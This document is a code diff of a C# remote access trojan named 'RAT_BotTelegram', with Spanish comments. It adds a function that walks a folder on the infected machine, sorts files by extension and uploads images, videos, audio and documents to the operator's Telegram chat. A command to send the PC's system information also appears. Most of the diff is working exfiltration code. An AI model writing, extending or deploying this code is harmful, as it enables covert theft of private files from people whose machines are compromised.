@@ -76,41 +76,7 @@ namespace RAT_BotTelegram {
                 case "/Get_Information":
                     await Bot.SendTextMessageAsync(config.id, Tools.PC_Info());
                     break;
-
-                //case "/GetDir_Document":
-                //    await Bot.SendTextMessageAsync(config.id, "Espere, obteniendo datos...");
-                //    //string[] allfiles = Directory.GetFiles(@"O:\Estoo", "*.*", SearchOption.AllDirectories);
-                //    //string[] authorsList = authors.Split(", ")
-
-
-                //    foreach (var file in Tools.GetFile(@"O:\Estoo")) {
-                //        FileInfo info = new FileInfo(file);
-                //        Console.WriteLine("File: " + info);
-                //        await  Bot.SendTextMessageAsync(config.id, file);
-
-                //        //await  Bot.SendDocumentAsync(id,SendDocumentRequest);
-                //        //await Bot.SendDocumentAsync(chatId: config.id,);
-                //        //await Bot.SendDocumentAsync(
-                //        //chatId: callbackQuery.Message.Chat.Id,
-                //        //document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf"
-                //        //);
-
-
-                //        // Do something with the Folder or just add them to a list via nameoflist.add();
-
-                //    }
-                //    await Bot.SendTextMessageAsync(config.id,"Elija una opción");
-                //    break;
-
                 case "/Get_Files":  // Menú Obtiene archivos
-                    //foreach (var file in Tools.GetFile(@"O:\Estoo")) {
-                    //    FileInfo info = new FileInfo(file);
-
-                    //    var archivo = new InlineKeyboardMarkup(new[] { InlineKeyboardButton.WithCallbackData(text: info + "", callbackData: "GetDocument") });
-
-                    //    await Bot.SendTextMessageAsync(config.id, "Se obtuvo...", replyMarkup: archivo);
-                    //    //await Bot.SendTextMessageAsync(config.id, "" + "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");
-                    //}
                     var GetFiles = new InlineKeyboardMarkup(new[]{
                     new[]{
                         InlineKeyboardButton.WithCallbackData(
@@ -159,29 +125,14 @@ namespace RAT_BotTelegram {
             }
         }
 
-       
-
-        public string getTypeFile(string File) {
-            String[] video  = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv" };
-            String[] audio  = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a" };
-            String[] doc    = { "doc", "docx", "txt", "log", "ppt", "pptx" };
-            String[] imagen = { "ico", "jpe", "jpe", "jpeg", "png", "bmp" };
-            String[] system = { "ani", "bat", "bfc", "bkf", "blg", "cat", "cer", "cfg", "chm", "chk", "clp", "cmd", "cnf", "com", "cpl", "crl", "crt", "cur", "dat", "db",
-                                "der", "dll", "drv", "ds", "dsn" , "dun","exe","fnd","fng","fon","grp","hlp","ht","inf","ini","ins","isp","job","key","lnk","msi","msp","msstyles",
-                                "nfo","ocx","otf","p7c","pfm","pif","pko","pma","pmc","pml","pmr","pmw","pnf","psw","qds","rdp","reg","scf","scr","sct","shb","shs","sys","theme",
-                                "tmp","ttc","ttf","udl","vxd","wab","wmdb","wme","wsc","wsf","wsh","zap"};
-
-            return ""; // Extension File
-        }
-
         private static async void BotOnCallbackQueryReceived(object sender, CallbackQueryEventArgs callbackQueryEventArgs) {
             string GetFileName(string dir) {   // Retorna solo el nombre del archivo
                                               //string path = @"D:\PNG Icons\System Win 10\camera.png";
                 try {
                     /* Utiliza la variable para obtener el ultimo contendor 
                      * =Ejemplo:
-                     * [Antes]    path = @"Contenedor1\Contenedor2\Contenedor3" 
-                     * [Despues]  path =  "Contenedor3"                                                     */
+                     * [Antes]    path = "C:\User\UserName\Photos\SoyUnaImagen.png" 
+                     * [Despues]  path =  "SoyUnaImagen.png"                                                         */
                     int palabraClave = dir.LastIndexOf(@"\");
                     dir = dir.Substring(palabraClave + 1);
                 } catch {
@@ -199,20 +150,18 @@ namespace RAT_BotTelegram {
                string dir = GetFileName(File);
                //string dir2 = dir;       // Solo antibuggeo
                 try {
-                    /* Utiliza la variable para obtener el ultimo contendor 
-                     * =Ejemplo:
-                     * [Antes]    path = "SoyUnaImagen.png" 
-                     * [Despues]  path =  "png"                                                     */
                 int palabraClave = dir.LastIndexOf(".");
                     dir = dir.Substring(palabraClave + 1);
                 } catch {
                     return  "[-]";
                 }
 
-                String[] video = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv" };
-                String[] audio = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a" };
-                String[] doc = { "doc", "docx", "txt", "log", "ppt", "pptx", "pdf" };
-                String[] imagen = { "jpeg", "png", "bmp","ico", "jpe", "jpe" };
+                // Convierte la extensión en minuscula.
+                dir = dir.ToLower();
+                String[] video  = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv" };
+                String[] audio  = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a" };
+                String[] doc    = { "doc", "docx", "txt", "log", "ppt", "pptx", "pdf" };
+                String[] imagen = {"jpg", "jpeg", "png", "bmp","ico", "jpe", "jpe" };
                 String[] system = { "ani", "bat", "bfc", "bkf", "blg", "cat", "cer", "cfg", "chm", "chk", "clp", "cmd", "cnf", "com", "cpl", "crl", "crt", "cur", "dat", "db",
                                 "der", "dll", "drv", "ds", "dsn" , "dun","exe","fnd","fng","fon","grp","hlp","ht","inf","ini","ins","isp","job","key","lnk","msi","msp","msstyles",
                                 "nfo","ocx","otf","p7c","pfm","pif","pko","pma","pmc","pml","pmr","pmw","pnf","psw","qds","rdp","reg","scf","scr","sct","shb","shs","sys","theme",
@@ -262,67 +211,60 @@ namespace RAT_BotTelegram {
                 return "[-]"; // Extension File
             }
 
-            
+            async void GetFilesTelegram(string Path) { // Sube los archivos obtenidos a telegram
 
+                await Bot.SendTextMessageAsync(config.id, "******************** Start ********************** ");
+                foreach (var file in Tools.GetFile(Path)) {
 
+                    switch (GetFileType(file)) {
+                        case "[Imagen]":
+                            try {
+                               await Bot.SendPhotoAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
+                            } catch {
+                                await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
+                            }
+                            break;
+                        case "[Video]":
+                            try {
+                                await Bot.SendVideoAsync(config.id, File.Open(file, FileMode.Open));
+                            } catch (Exception e) {
+                                await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file) + "\n\n, quizas se deba a que el archivo de video es mayora 10mb. [Se tratará de buscar una sólución en las proximas actualizaciones]");
+                                Console.WriteLine("Hubo un error: \n" + e);
+                            }
+                            break;
+                        case "[Audio]":
+                            try {
+                                await Bot.SendAudioAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
+                            } catch (Exception) {
+                                await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
+                            }
+                            break;
+                        case "[Doc]":
+                            try {
+                                await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
+                            } catch (Exception) {
+                                await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
+                            }
+                            break;
+                        default:
+                            await Bot.SendTextMessageAsync(config.id, "Se ignoró el archivo " + GetFileName(file));
+                            break;
+                    }
 
-
-
+                    await Bot.SendTextMessageAsync(config.id, file);
+                }
+                await Bot.SendTextMessageAsync(config.id, "******************** Finish ********************* ");
+            }
 
 
             var callbackQuery = callbackQueryEventArgs.CallbackQuery;
-
-            
 
             switch (callbackQuery.Data) {
 
 
                 case "GetDocument":
-
-                    await Bot.SendTextMessageAsync(config.id, "******************** Start ********************** ");
-                    foreach (var file in Tools.GetFile(@"O:\Estoo")) {
-                        //FileInfo info = new FileInfo(file);
-                        //await Bot.SendTextMessageAsync(config.id, "<| " + file + info + " |>\n" + "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");
-                       
-                        
-                        switch (GetFileType(file)) {
-                            case "[Imagen]":
-                                try {
-                                    await Bot.SendPhotoAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
-                                } catch  {
-                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, "+ GetFileName(file));
-                                }
-                                break;
-                            case "[Video]":
-                                try {
-                                    await Bot.SendVideoAsync(config.id, File.Open(file, FileMode.Open));
-                                } catch (Exception) {
-                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
-                                }
-                                break;
-                            case "[Audio]":
-                                try {
-                                    await Bot.SendAudioAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
-                                } catch (Exception) {
-                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
-                                }
-                                break;
-                            case "[Doc]":
-                                try {
-                                    await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
-                                } catch (Exception) {
-                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
-                                }
-                                break;
-                            default:
-                                await Bot.SendTextMessageAsync(config.id, "Se ignoró el archivo " + GetFileName(file));
-                                break;
-                        }
-
-                        await Bot.SendTextMessageAsync(config.id, file);
-                        //await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open));
-                    }
-                    await Bot.SendTextMessageAsync(config.id, "******************** Finish ********************* ");
+                    GetFilesTelegram(@"F:\New folder (2)");
+                    
                     break;
 
                 case "GetDocumenttgert":
